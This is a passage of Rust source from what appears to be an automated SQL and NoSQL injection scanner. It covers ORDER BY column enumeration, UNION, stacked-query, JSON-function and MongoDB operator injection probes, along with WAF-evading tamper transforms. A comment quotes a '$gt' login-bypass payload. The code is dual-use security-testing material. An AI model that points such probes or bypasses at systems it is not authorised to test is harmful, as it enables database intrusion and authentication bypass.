                        .map(super::super::techniques::tamper::Tamper::name)
                        .collect::<Vec<_>>()
                        .join(",")
                };
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Time,
                    r.confidence,
                    format!(
                        "time delay {:.0}ms > threshold {:.0}ms tamper={} control={:.0}ms{}{}{}",
                        r.measured_ms,
                        detector.threshold(),
                        tamper_label,
                        control_ms,
                        opts.evidence_suffix(),
                        popts.evidence_suffix(),
                        matcher.evidence_suffix()
                    ),
                );
                finding.dbms = base.dbms.clone();
                state.write().await.push_finding(finding);
                confirmed = true;
                break;
            }
        }
        if confirmed {
            break;
        }
    }
}

/// Enumerate column count via ORDER BY probing before UNION.
/// Sequential probing `ORDER BY 1 .. MAX`, stops at first error detected by
/// `UnionDetector::evaluate_order_by`. Returns `Some(n)` where `n = failed_index - 1`.
/// Rate limiting and jitter are preserved via `fetch_for_payload`; cancellation is honoured.
#[allow(clippy::too_many_arguments)]
async fn enumerate_columns_via_order_by(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    marker_set: &MarkerSet,
    detector: &UnionDetector,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
    seed: Option<u64>,
    context: &InjectionContext,
    deadline: Option<std::time::Instant>,
) -> Option<usize> {
    // Seeded tamper RNG (`--seed`): same seed yields identical payloads;
    // `None` preserves the historical OS-random behaviour.
    let mut rng = crate::seeded_rng::make_rng(seed);
    // `--level` widens ORDER BY enumeration: L1=10 (historical), L2=15, L3+=20.
    let max_order_by_cols: usize = match level {
        1 => 10,
        2 => 15,
        _ => 20,
    };
    let sets = tamper_transformation_sets(tampers);
    // Quote-aware prefix: the inferred context leads so `order_by` sinks
    // confirm within the historical 10-probe budget (see
    // `order_by_prefix_for_context`). One probe per index, as before.
    let prefix = order_by_prefix_for_context(context);
    for i in 1..=max_order_by_cols {
        if cancel.is_cancelled() {
            return None;
        }
        // Shared `--max-duration` deadline: stop enumeration early so one
        // technique cannot silently overshoot an explicit user budget.
        if check_deadline(deadline, &param.key(), "union-order-by") {
            return None;
        }
        let base = crate::techniques::union::payloads::order_by_payload_for(prefix, i);
        let mut triggered = false;
        for trans in &sets {
            if cancel.is_cancelled() {
                return None;
            }
            let payload = build_final_payload_with_rng(&base, trans, popts, &mut rng);
            let (raw_body, _ms, status) = fetch_for_payload(
                client, state, cancel, target, target_str, param, &payload, marker_set, raw, opts,
                popts,
            )
            .await;
            // `--ignore-code`: an ignored response never triggers an ORDER BY error.
            if is_ignored(status, ignore_codes) {
                continue;
            }
            let body = matcher.pre_process(&raw_body);
            if detector.evaluate_order_by(&body) {
                triggered = true;
                break;
            }
        }
        if triggered {
            if i == 1 {
                warn!("ORDER BY 1 already errored — ORDER BY enumeration inconclusive");
                return None;
            }
            let inferred = i - 1;
            info!(inferred, "ORDER BY enumeration inferred column count");
            return Some(inferred);
        }
    }
    // Undetermined is actionable (yellow warn, not a drowned `info!`): the
    // operator can widen the enumeration instead of assuming "not
    // injectable". The hint is level-aware so L2 runs are not told to
    // "try --level 2" again.
    let level_hint = match level {
        0 | 1 => "try --level 2 (15 cols)",
        2 => "try --level 3 (20 cols)",
        _ => "already at max enumeration (20 cols)",
    };
    warn!(
        "ORDER BY enumeration inconclusive: no error up to {max_order_by_cols} columns — {level_hint}"
    );
    None
}

#[allow(clippy::too_many_arguments)]
#[allow(clippy::too_many_lines)]
async fn test_union_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
    seed: Option<u64>,
    context: &InjectionContext,
    dbms_belief: &DbmsBelief,
    deadline: Option<std::time::Instant>,
) {
    if context.order_by {
        debug!(
            param = param.key(),
            "union: order_by context, ORDER BY enumeration prioritized"
        );
    }
    let (top_dbms, top_prob) = dbms_belief.top_candidate();
    debug!(param = param.key(), context = context.summary(), %top_dbms, top_prob, "union: context-aware detection");
    // Seeded tamper RNG (`--seed`): same seed yields identical payloads;
    // `None` preserves the historical OS-random behaviour.
    let mut rng = crate::seeded_rng::make_rng(seed);
    let detector = UnionDetector::new();
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    let tamper_sets = tamper_transformation_sets(tampers);

    // Phase 0 — ORDER BY enumeration to reduce false positives.
    // Prioritized when `context.order_by` (the prefix cycle leads with the
    // inferred quote); always runs otherwise too, since the inferred count
    // gates the UNION column trials. If we successfully infer `n`, we test
    // only `n` first. If that fails, we still fall back to the heuristic
    // list (excluding the already-tried `n`) to keep coverage for edge
    // cases where ORDER BY is WAF-filtered but UNION still works.
    let inferred = enumerate_columns_via_order_by(
        client,
        state,
        cancel,
        target,
        target_str,
        param,
        marker_set,
        &detector,
        raw,
        tampers,
        opts,
        popts,
        matcher,
        level,
        ignore_codes,
        seed,
        context,
        deadline,
    )
    .await;
    // DBMS-aware UNION cores once the belief is actionable (>= 0.85);
    // otherwise the generic polyglot head (unchanged default).
    let dbms_label = dbms_payload_label(dbms_belief);

    let mut cols_to_try: Vec<usize> = Vec::new();
    let mut fallback = vec![3usize, 2, 4, 5];
    if let Some(n) = inferred {
        cols_to_try.push(n);
        // Keep fallback for resilience but avoid duplicate probe
        fallback.retain(|c| *c != n);
    } else {
        cols_to_try = fallback.clone();
        fallback.clear();
    }

    // Primary pass: inferred or heuristic
    for cols in &cols_to_try {
        if cancel.is_cancelled() {
            return;
        }
        // Shared `--max-duration` deadline: stop the matrix early so one
        // technique cannot silently overshoot an explicit user budget.
        if check_deadline(deadline, &param.key(), "union") {
            return;
        }
        let cols = *cols;
        let payloads = union_payloads_for(dbms_label, cols);
        for p in payloads
            .iter()
            .take(payload_budget(level, 1, payloads.len()))
        {
            if cancel.is_cancelled() {
                return;
            }
            // Shared `--max-duration` deadline: stop the matrix early (see
            // per-cols check above).
            if check_deadline(deadline, &param.key(), "union") {
                return;
            }
            for trans in &tamper_sets {
                if cancel.is_cancelled() {
                    return;
                }
                let tampered = build_final_payload_with_rng(&p.payload, trans, popts, &mut rng);
                let (raw_body, ms, status) = fetch_for_payload(
                    client, state, cancel, target, target_str, param, &tampered, marker_set, raw,
                    opts, popts,
                )
                .await;
                // `--ignore-code`: an ignored status is skipped, never a finding.
                if is_ignored(status, ignore_codes) {
                    continue;
                }
                let body = matcher.pre_process(&raw_body);
                let r =
                    detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols, &p.marker);
                if r.is_vulnerable {
                    // Matcher veto gate: `Some(false)` rejects the candidate.
                    if matcher.matches(&body, status) == Some(false) {
                        continue;
                    }
                    let tamper_label = if trans.is_empty() {
                        "none".to_owned()
                    } else {
                        trans
                            .iter()
                            .map(super::super::techniques::tamper::Tamper::name)
                            .collect::<Vec<_>>()
                            .join(",")
                    };
                    let mut finding = Finding::new(
                        target.as_str(),
                        param.key(),
                        TechniqueKind::Union,
                        r.confidence,
                        format!(
                            "union columns={:?} payload={} order_by_inferred={:?} tamper={}{}{}{}",
                            r.columns,
                            tampered,
                            inferred,
                            tamper_label,
                            opts.evidence_suffix(),
                            popts.evidence_suffix(),
                            matcher.evidence_suffix()
                        ),
                    );
                    finding.dbms = Some(p.dbms.clone());
                    state.write().await.push_finding(finding);
                    return;
                }
            }
        }
    }

    // Secondary pass: fallback heuristic if primary (inferred) yielded nothing
    for cols in fallback {
        if cancel.is_cancelled() {
            break;
        }
        // Shared `--max-duration` deadline (see primary pass above).
        if check_deadline(deadline, &param.key(), "union") {
            break;
        }
        let payloads = union_payloads_for(dbms_label, cols);
        for p in payloads
            .iter()
            .take(payload_budget(level, 1, payloads.len()))
        {
            if cancel.is_cancelled() {
                break;
            }
            for trans in &tamper_sets {
                if cancel.is_cancelled() {
                    break;
                }
                let tampered = build_final_payload_with_rng(&p.payload, trans, popts, &mut rng);
                let (raw_body, ms, status) = fetch_for_payload(
                    client, state, cancel, target, target_str, param, &tampered, marker_set, raw,
                    opts, popts,
                )
                .await;
                // `--ignore-code`: an ignored status is skipped, never a finding.
                if is_ignored(status, ignore_codes) {
                    continue;
                }
                let body = matcher.pre_process(&raw_body);
                let r =
                    detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols, &p.marker);
                if r.is_vulnerable {
                    // Matcher veto gate: `Some(false)` rejects the candidate.
                    if matcher.matches(&body, status) == Some(false) {
                        continue;
                    }
                    let tamper_label = if trans.is_empty() {
                        "none".to_owned()
                    } else {
                        trans
                            .iter()
                            .map(super::super::techniques::tamper::Tamper::name)
                            .collect::<Vec<_>>()
                            .join(",")
                    };
                    let mut finding = Finding::new(
                        target.as_str(),
                        param.key(),
                        TechniqueKind::Union,
                        r.confidence,
                        format!(
                            "union columns={:?} payload={} order_by_inferred={:?} (fallback) tamper={}{}{}{}",
                            r.columns,
                            tampered,
                            inferred,
                            tamper_label,
                            opts.evidence_suffix(),
                            popts.evidence_suffix(),
                            matcher.evidence_suffix()
                        ),
                    );
                    finding.dbms = Some(p.dbms.clone());
                    state.write().await.push_finding(finding);
                    return;
                }
            }
        }
    }
}

#[allow(clippy::too_many_arguments)]
#[allow(clippy::too_many_lines)]
async fn test_stacked_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
    seed: Option<u64>,
    context: &InjectionContext,
    dbms_belief: &DbmsBelief,
) {
    let (top_dbms, top_prob) = dbms_belief.top_candidate();
    debug!(param = param.key(), context = context.summary(), %top_dbms, top_prob, "stacked: context-aware detection");
    // Seeded tamper RNG (`--seed`): same seed yields identical payloads;
    // `None` preserves the historical OS-random behaviour.
    let mut rng = crate::seeded_rng::make_rng(seed);
    let detector = StackedDetector::new();
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    // DBMS-aware stacked cores once actionable (>= 0.85), else generics.
    let payloads = stacked_payloads_for(dbms_payload_label(dbms_belief));
    let tamper_sets = tamper_transformation_sets(tampers);
    for p in payloads
        .iter()
        .take(payload_budget(level, 2, payloads.len()))
    {
        if cancel.is_cancelled() {
            break;
        }
        let mut found = false;
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                break;
            }
            let tampered = build_final_payload_with_rng(&p.payload, trans, popts, &mut rng);
            let (raw_body, ms, status) = fetch_for_payload(
                client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
                popts,
            )
            .await;
            let body = matcher.pre_process(&raw_body);
            // `--ignore-code`: an ignored status is skipped, never a finding.
            if is_ignored(status, ignore_codes) {
                continue;
            }
            let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, p, &tampered);
            if r.is_vulnerable {
                // Matcher veto gate: `Some(false)` rejects the candidate.
                if matcher.matches(&body, status) == Some(false) {
                    continue;
                }
                // Second-shot confirmation with a FRESH marker: the same sink
                // must execute a different stacked statement before reporting.
                // A single marker echo (reflected input, dynamic page) never
                // reports. OPSEC: the extra request fires only on a positive
                // first shot — clean targets cost the same as before.
                // Same DBMS family as the first shot (coherent confirmation).
                let confirm_payloads = stacked_payloads_for(dbms_payload_label(dbms_belief));
                let Some(confirm) = confirm_payloads.first() else {
                    continue;
                };
                let confirm_tampered =
                    build_final_payload_with_rng(&confirm.payload, trans, popts, &mut rng);
                if cancel.is_cancelled() {
                    break;
                }
                let (raw_body2, ms2, status2) = fetch_for_payload(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    &confirm_tampered,
                    marker_set,
                    raw,
                    opts,
                    popts,
                )
                .await;
                // `--ignore-code`: an ignored status is skipped, never a finding.
                if is_ignored(status2, ignore_codes) {
                    continue;
                }
                let body2 = matcher.pre_process(&raw_body2);
                if matcher.matches(&body2, status2) == Some(false) {
                    continue;
                }
                let r2 = detector.evaluate(
                    &baseline_body,
                    &body2,
                    baseline.mean_ms,
                    ms2,
                    confirm,
                    &confirm_tampered,
                );
                if !r2.is_vulnerable {
                    continue;
                }
                let tamper_label = if trans.is_empty() {
                    "none".to_owned()
                } else {
                    trans
                        .iter()
                        .map(super::super::techniques::tamper::Tamper::name)
                        .collect::<Vec<_>>()
                        .join(",")
                };
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Stacked,
                    r2.confidence.min(r.confidence),
                    format!(
                        "stacked dbms={} marker={} tamper={} confirmed=true{}{}{}",
                        r2.dbms.as_deref().unwrap_or("?"),
                        p.marker,
                        tamper_label,
                        opts.evidence_suffix(),
                        popts.evidence_suffix(),
                        matcher.evidence_suffix()
                    ),
                );
                finding.dbms = r.dbms.clone();
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
        }
        if found {
            break;
        }
    }
}

/// JSON-function injection: boolean differential over `JSON_EXTRACT` / `->>` /
/// `JSON_VALUE` pairs (3-trial confirmation) plus a single-shot error probe
/// (`__bad__` sentinel document → per-DBMS JSON error text).
#[allow(clippy::too_many_arguments)]
#[allow(clippy::similar_names)]
#[allow(clippy::too_many_lines)]
async fn test_json_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
    seed: Option<u64>,
    context: &InjectionContext,
    dbms_belief: &DbmsBelief,
) {
    if context.json {
        debug!(
            param = param.key(),
            "json: json context, json priors boosted"
        );
    }
    let (top_dbms, top_prob) = dbms_belief.top_candidate();
    debug!(param = param.key(), context = context.summary(), %top_dbms, top_prob, "json: context-aware detection");
    // Seeded tamper RNG (`--seed`): same seed yields identical payloads;
    // `None` preserves the historical OS-random behaviour.
    let mut rng = crate::seeded_rng::make_rng(seed);
    let detector = JsonDetector::new();
    // JSON boost: `context.json` already lifts the hypothesis prior to 0.45
    // (see `compute_calibrated_prior`) so the scheduler tries JSON early;
    // a confident DBMS belief additionally narrows to that engine's
    // JSON family instead of the generic 3-DBMS sweep.
    let payloads = json_scan_payloads(dbms_payload_label(dbms_belief));
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    // Same boolean-differential constraint as `test_boolean_bounded`: opaque
    // tampers (e.g. base64encode) would make TRUE/FALSE indistinguishable.
    let tamper_sets = boolean_safe_transformation_sets(tampers);
    for p in payloads
        .iter()
        .take(payload_budget(level, 2, payloads.len()))
    {
        if cancel.is_cancelled() {
            break;
        }
        let mut found = false;
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                break;
            }
            let true_payload =
                build_final_payload_with_rng(&p.true_payload, trans, popts, &mut rng);
            let false_payload =
                build_final_payload_with_rng(&p.false_payload, trans, popts, &mut rng);
            let error_probe =
                build_final_payload_with_rng(&p.error_payload, trans, popts, &mut rng);
            let tamper_label = if trans.is_empty() {
                "none".to_owned()
            } else {
                trans
                    .iter()
                    .map(super::super::techniques::tamper::Tamper::name)
                    .collect::<Vec<_>>()
                    .join(",")
            };
            // Channel 1 — boolean differential with confirmation (3 trials)
            let mut trials: Vec<crate::detection::confirmation::Trial> = Vec::with_capacity(3);
            let mut last_res: Option<crate::techniques::boolean::detector::BooleanResult> = None;
            let mut last_true = String::new();
            let mut last_false = String::new();
            let mut last_t_status: u16 = 0;
            #[allow(clippy::similar_names)]
            let mut last_f_status: u16 = 0;
            for _ in 0..3 {
                if cancel.is_cancelled() {
                    break;
                }
                let (true_raw, true_ms, true_status) = fetch_for_payload_with_class(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    &true_payload,
                    marker_set,
                    raw,
                    opts,
                    popts,
                    RequestClass::Boolean,
                )
                .await;
                let true_body = matcher.pre_process(&true_raw);
                let (false_raw, false_ms, false_status) = fetch_for_payload_with_class(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    &false_payload,
                    marker_set,
                    raw,
                    opts,
                    popts,
                    RequestClass::Boolean,
                )
                .await;
                let false_body = matcher.pre_process(&false_raw);
                // Transport failure (`status == 0`) is never scored — neutral
                // trial, consistent with `test_boolean_bounded`.
                if true_status == 0 || false_status == 0 {
                    trials.push(crate::detection::confirmation::Trial {
                        true_conf: 0.5,
                        false_conf: 0.5,
                    });
                    last_true = true_body;
                    last_false = false_body;
                    last_t_status = true_status;
                    last_f_status = false_status;
                    continue;
                }
                // `--ignore-code`: an ignored status counts as a negative trial, never a finding.
                if is_ignored(true_status, ignore_codes) || is_ignored(false_status, ignore_codes) {
                    trials.push(crate::detection::confirmation::Trial {
                        true_conf: 0.0,
                        false_conf: 1.0,
                    });
                    last_true = true_body;
                    last_false = false_body;
                    last_t_status = true_status;
                    last_f_status = false_status;
                    continue;
                }
                let res = detector.evaluate_boolean(
                    &baseline_body,
                    &true_body,
                    &false_body,
                    baseline.mean_ms,
                    true_ms,
                    false_ms,
                );
                trials.push(crate::detection::confirmation::Trial {
                    true_conf: res.true_similarity,
                    false_conf: res.false_similarity,
                });
                last_res = Some(res);
                last_true = true_body;
                last_false = false_body;
                last_t_status = true_status;
                last_f_status = false_status;
            }
            let (conf, inverted) = crate::detection::confirmation::confirm_either(&trials);
            if conf.confirmed {
                // Matcher veto gate: `Some(false)` rejects the candidate.
                if matcher.gate_boolean(&last_true, &last_false, last_t_status, last_f_status)
                    == Some(false)
                {
                    continue;
                }
                let res = last_res.unwrap_or_else(|| {
                    detector.evaluate_boolean(&baseline_body, "", "", baseline.mean_ms, 0.0, 0.0)
                });
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Json,
                    conf.score,
                    format!(
                        "json channel=boolean dbms={} true_sim={:.2} false_sim={:.2} trials={}/3 fp={:.2} tamper={}{}{}{}{}",
                        p.dbms,
                        res.true_similarity,
                        res.false_similarity,
                        conf.trials,
                        conf.false_positive_prob,
                        tamper_label,
                        opts.evidence_suffix(),
                        popts.evidence_suffix(),
                        matcher.evidence_suffix(),
                        if inverted { " inverted" } else { "" }
                    ),
                )
                .with_false_positive_prob(conf.false_positive_prob)
                .with_waf(baseline.waf_vendor.clone(), baseline.is_waf_blocking());
                finding.dbms = Some(p.dbms.clone());
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
            // Channel 2 — single-shot JSON error probe
            let (raw_body, _ms, status) = fetch_for_payload(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                &error_probe,
                marker_set,
                raw,
                opts,
                popts,
            )
            .await;
            let body = matcher.pre_process(&raw_body);
            // `--ignore-code`: an ignored status is skipped, never a finding.
            if is_ignored(status, ignore_codes) {
                continue;
            }
            let r = detector.evaluate_error(&body);
            if r.is_vulnerable {
                // Matcher veto gate: `Some(false)` rejects the candidate.
                if matcher.matches(&body, status) == Some(false) {
                    continue;
                }
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Json,
                    r.confidence,
                    format!(
                        "json channel=error pattern={:?} tamper={}{}{}{}",
                        r.matched_pattern,
                        tamper_label,
                        opts.evidence_suffix(),
                        popts.evidence_suffix(),
                        matcher.evidence_suffix()
                    ),
                );
                finding.dbms = r.dbms.clone().or_else(|| Some(p.dbms.clone()));
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
        }
        if found {
            break;
        }
    }
}

/// `NoSQL` (MongoDB) operator injection: boolean differential over `$gt`/`$ne`/
/// `$regex` operator pairs (3-trial confirmation) plus a single-shot error
/// probe (`$where` JS invalide / opérateur inconnu → messages MongoDB).
///
/// Deux chemins d'injection :
/// - bodies JSON (`param` Body + corps JSON) : la feuille
///   `{"user":"admin"}` devient un **objet** `{"user":{"$gt":""}}` via
///   `inject_json_operator` (bypass `{"user": {"$gt": ""}}` sans identifiants).
///   Les tampers chaîne ne s'appliquent pas ici (un opérateur doit rester du
///   JSON valide) ;
/// - Query / Form / Header / Cookie : les mêmes opérateurs sont envoyés comme
///   **chaînes** (`{"$gt": ""}` en valeur de param) via le chemin générique
///   (tampers boolean-safe + `--prefix`/`--suffix` honorés).
#[allow(clippy::too_many_arguments)]
#[allow(clippy::similar_names)]
#[allow(clippy::too_many_lines)]
async fn test_nosql_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
    seed: Option<u64>,
    context: &InjectionContext,
) {
    if context.json {
        debug!(
            param = param.key(),
            "nosql: json context, nosql priors boosted"
        );
    }
    debug!(
        param = param.key(),
        context = context.summary(),
        "nosql: context-aware detection"
    );
    let mut rng = crate::seeded_rng::make_rng(seed);
    let detector = NosqlDetector::new();
    let payloads = nosql_payloads();
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    let tamper_sets = boolean_safe_transformation_sets(tampers);
    // Chemin opérateur JSON ? Body + corps JSON + feuille scalaire.
    let json_operator_path: Option<String> = match &param.location {
        ParameterLocation::Body => {
            let body_opt = raw.and_then(|r| r.body.as_deref());
            let ct = raw.and_then(|r| r.content_type());
            body_opt
                .filter(|body| {
                    crate::target::structured::sniff_kind(ct, body)
                        == crate::target::structured::StructuredKind::Json
                })
                .map(str::to_owned)
        }
        _ => None,
    };
    for p in payloads
        .iter()
        .take(payload_budget(level, 2, payloads.len()))
    {
        if cancel.is_cancelled() {
            break;
        }
        let mut found = false;
        // Tampers chaîne uniquement pour le chemin non-JSON ; le chemin
        // opérateur envoie du JSON valide tel quel (1 seul set `none`).
        let tamper_rounds: usize = if json_operator_path.is_some() {
            1
        } else {
            tamper_sets.len().max(1)
        };
        for round in 0..tamper_rounds {
            if cancel.is_cancelled() {
                break;
            }
            let trans: &[Tamper] = if json_operator_path.is_some() {
                &[]
            } else {
                tamper_sets.get(round).map_or(&[], Vec::as_slice)
            };
            let tamper_label = if trans.is_empty() {
                "none".to_owned()
            } else {
                trans
                    .iter()
                    .map(super::super::techniques::tamper::Tamper::name)
                    .collect::<Vec<_>>()
                    .join(",")
            };
            // Channel 1 — boolean differential with confirmation (3 trials)
            let mut trials: Vec<crate::detection::confirmation::Trial> = Vec::with_capacity(3);
            let mut last_res: Option<crate::techniques::boolean::detector::BooleanResult> = None;
            let mut last_true = String::new();
            let mut last_false = String::new();
            let mut last_t_status: u16 = 0;
            #[allow(clippy::similar_names)]
            let mut last_f_status: u16 = 0;
            for _ in 0..3 {
                if cancel.is_cancelled() {
                    break;
                }
                let (true_raw, true_ms, true_status) = fetch_nosql_boolean(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    raw,
                    json_operator_path.as_deref(),
                    &p.true_operator,
                    &p.true_payload,
                    trans,
                    marker_set,
                    opts,
                    popts,
                    &mut rng,
                )
                .await;
                let true_body = matcher.pre_process(&true_raw);
                let (false_raw, false_ms, false_status) = fetch_nosql_boolean(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    raw,
                    json_operator_path.as_deref(),
                    &p.false_operator,
                    &p.false_payload,
                    trans,
                    marker_set,
                    opts,
                    popts,
                    &mut rng,
                )
                .await;
                let false_body = matcher.pre_process(&false_raw);
                // Transport failure (`status == 0`) is never scored — neutral
                // trial, consistent with `test_boolean_bounded`.
                if true_status == 0 || false_status == 0 {
                    trials.push(crate::detection::confirmation::Trial {
                        true_conf: 0.5,
                        false_conf: 0.5,
                    });
                    last_true = true_body;
                    last_false = false_body;
                    last_t_status = true_status;
                    last_f_status = false_status;
                    continue;
                }
                if is_ignored(true_status, ignore_codes) || is_ignored(false_status, ignore_codes) {
                    trials.push(crate::detection::confirmation::Trial {
                        true_conf: 0.0,
                        false_conf: 1.0,
                    });
                    last_true = true_body;
                    last_false = false_body;
                    last_t_status = true_status;
                    last_f_status = false_status;
                    continue;
                }
                let res = detector.evaluate_boolean(
                    &baseline_body,
                    &true_body,
                    &false_body,
                    baseline.mean_ms,
                    true_ms,
                    false_ms,
                );
                trials.push(crate::detection::confirmation::Trial {
                    true_conf: res.true_similarity,
                    false_conf: res.false_similarity,
                });
                last_res = Some(res);
                last_true = true_body;
                last_false = false_body;
                last_t_status = true_status;
                last_f_status = false_status;
            }
            let (conf, inverted) = crate::detection::confirmation::confirm_either(&trials);
            if conf.confirmed {
                if matcher.gate_boolean(&last_true, &last_false, last_t_status, last_f_status)
                    == Some(false)
                {
                    continue;
                }
                let res = last_res.unwrap_or_else(|| {
                    detector.evaluate_boolean(&baseline_body, "", "", baseline.mean_ms, 0.0, 0.0)
                });
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Nosql,
                    conf.score,
                    format!(
                        "nosql channel=boolean vector={} dbms=mongodb true_sim={:.2} false_sim={:.2} trials={}/3 fp={:.2} tamper={}{}{}{}{}",
                        p.vector,
                        res.true_similarity,
                        res.false_similarity,
                        conf.trials,
                        conf.false_positive_prob,
                        tamper_label,
                        opts.evidence_suffix(),
                        popts.evidence_suffix(),
                        matcher.evidence_suffix(),
                        if inverted { " inverted" } else { "" }
                    ),
                )
                .with_false_positive_prob(conf.false_positive_prob)
                .with_waf(baseline.waf_vendor.clone(), baseline.is_waf_blocking());
                finding.dbms = Some("mongodb".to_owned());
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
            // Channel 2 — single-shot NoSQL error probe
            let (raw_body, _ms, status) = fetch_nosql_error(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                raw,
                json_operator_path.as_deref(),
                &p.error_payload,
                trans,
                marker_set,
                opts,
                popts,
                &mut rng,
            )
            .await;
            let body = matcher.pre_process(&raw_body);
            if is_ignored(status, ignore_codes) {
                continue;
            }
            let r = detector.evaluate_error(&body);
            if r.is_vulnerable {
                if matcher.matches(&body, status) == Some(false) {
                    continue;
                }
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Nosql,
                    r.confidence,
                    format!(
                        "nosql channel=error vector={} pattern={:?} tamper={}{}{}{}",
                        p.vector,
                        r.matched_pattern,
                        tamper_label,
                        opts.evidence_suffix(),
                        popts.evidence_suffix(),
                        matcher.evidence_suffix()
                    ),
                );
                finding.dbms = Some("mongodb".to_owned());
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
        }
        if found {
            break;
        }
    }
}

/// Fetch du bras TRUE/FALSE `NoSQL` : objet opérateur sur bodies JSON,
/// chaîne tamperisée ailleurs. Retourne `(body, ms, status)` comme
/// `fetch_for_payload_with_class` (classe `Boolean`, statut 0 = transport).
#[allow(clippy::too_many_arguments)]
async fn fetch_nosql_boolean(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    raw: Option<&RawRequest>,
    json_body: Option<&str>,
    operator: &serde_json::Value,
    string_payload: &str,
    trans: &[Tamper],
    marker_set: &MarkerSet,
    opts: ProbeOpts,
    popts: &PayloadOpts,
    rng: &mut rand::rngs::StdRng,
) -> (String, f64, u16) {
    if let Some(original) = json_body
        && let Some(injected) =
            crate::target::structured::inject_json_operator(original, &param.name, operator)
    {
        let spec = nosql_json_body_spec(target, raw, &injected);
        return fetch_spec_boolean(client, state, cancel, spec).await;
    }
    let final_payload = build_final_payload_with_rng(string_payload, trans, popts, rng);
    fetch_for_payload_with_class(
        client,
        state,
        cancel,
        target,
        target_str,
        param,
        &final_payload,
        marker_set,
        raw,
        opts,
        popts,
        RequestClass::Boolean,
    )
    .await
}

/// Fetch de la sonde d'erreur `NoSQL` : objet `$where`/opérateur inconnu sur
/// bodies JSON (parsé depuis le littéral, repli chaîne), chaîne ailleurs.
#[allow(clippy::too_many_arguments)]
async fn fetch_nosql_error(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    raw: Option<&RawRequest>,
    json_body: Option<&str>,
    error_payload: &str,
    trans: &[Tamper],
    marker_set: &MarkerSet,
    opts: ProbeOpts,
    popts: &PayloadOpts,
    rng: &mut rand::rngs::StdRng,
) -> (String, f64, u16) {
    if let Some(original) = json_body
        && let Ok(op) = serde_json::from_str::<serde_json::Value>(error_payload)
        && op.is_object()
        && let Some(injected) =
            crate::target::structured::inject_json_operator(original, &param.name, &op)
    {
        let spec = nosql_json_body_spec(target, raw, &injected);
        return fetch_spec_boolean(client, state, cancel, spec).await;
    }
    let final_payload = build_final_payload_with_rng(error_payload, trans, popts, rng);
    fetch_for_payload(
        client,
        state,
        cancel,
        target,
        target_str,
        param,
        &final_payload,
        marker_set,
        raw,
        opts,
        popts,
    )
    .await
}

/// `RequestSpec` POST JSON pour un body opérateur déjà injecté (headers
/// préservés, `content-length` recalculé par la stack HTTP).
fn nosql_json_body_spec(
